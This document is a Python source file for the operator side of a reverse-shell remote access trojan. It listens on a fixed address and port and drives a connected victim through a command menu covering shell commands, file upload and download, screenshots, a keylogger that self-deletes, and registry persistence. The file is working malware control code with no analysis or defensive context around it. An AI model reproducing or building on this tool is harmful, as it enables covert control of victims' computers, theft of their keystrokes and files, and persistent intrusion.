import socket
import termcolor
import json
import os

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(file_name):
    file = open(file_name, 'rb')
    target.send(file.read())

def download_file(file_name):
    file = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        file.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout:
            break
    target.settimeout(None)
    file.close()

def target_communication():

    count = 0

    while True:
        command = input('Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'help':
            print(termcolor.colored(('''
            quit                                        --> Quits the session.
            clear                                       --> Clears the console.
            cd <DIRECTORY>                              --> Changes to specified directory.
            download <FILENAME>                         --> Download specified file.
            upload <FILENAME>                           --> Upload specified file.
            keylog_start                                --> Starts the keylogger.
            screenshot                                  --> Takes a screenshot.
            keylog_dump                                 --> Print the keystrokes that the target inputted.
            keylog_stop                                 --> Stops the keylogger and self-destroy the file.
            persistence <REGNAME> <FILENAME>            --> Create persistence in registry.
            '''), 'blue'))
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command == 'screenshot':
            file = open('screenshot%d' % count, 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                file.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            file.close()
            count += 1
        else:
            output = reliable_recv()
            print(output)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.92.95', 5555))
print(termcolor.colored(('[*] Listening For Incoming Connection.'), 'green'))
sock.listen(5)
target, ip = sock.accept()
print(termcolor.colored(('[+] Connection Established From ' + str(ip)), 'green'))
target_communication()

